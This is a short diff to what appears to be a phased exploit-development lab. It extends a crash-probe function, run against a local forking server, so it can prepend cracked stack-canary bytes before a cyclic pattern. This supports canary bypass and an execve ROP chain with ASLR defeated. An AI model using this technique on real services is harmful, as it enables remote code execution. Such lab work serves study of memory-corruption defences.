@@ -24,7 +24,7 @@ class LeakResult:
     libc_base: int
 
 
-def probe(server: ForkingServer, libc_path: str | Path) -> LeakResult:
+def probe(server: ForkingServer, libc_path: str | Path, prefix: bytes = b"") -> LeakResult:
     """Crashes one connection to `server` and recovers both the overflow
     offset and libc's real runtime base from the resulting crash dump —
     same byte-matching-a-mapped-file-header technique Phase 4 used for
@@ -33,9 +33,18 @@ def probe(server: ForkingServer, libc_path: str | Path) -> LeakResult:
     single crash against a genuinely ASLR'd target. The result is then
     reused by a *separate*, later connection to the same still-running
     server — valid because fork() never re-randomizes a child's memory
-    layout, not because ASLR was disabled anywhere."""
+    layout, not because ASLR was disabled anywhere.
+
+    `prefix` is sent before the cyclic pattern, unchanged — for a
+    canary-protected target (Phase 6's canary/ module), passing the
+    already-cracked canary bytes as `prefix` clears the canary check first,
+    so the cyclic pattern reaches the return address instead of tripping
+    __stack_chk_fail. `offset` is still relative to the start of the cyclic
+    part (i.e. right after `prefix`), matching how build_canary_execve_chain()
+    composes the final payload as `prefix + b"A" * offset + chain.payload()`.
+    """
     io = remote("127.0.0.1", server.port)
-    io.send(cyclic(_CRASH_PATTERN_LENGTH))
+    io.send(prefix + cyclic(_CRASH_PATTERN_LENGTH))
     io.recvall(timeout=2.0)
     io.close()
 
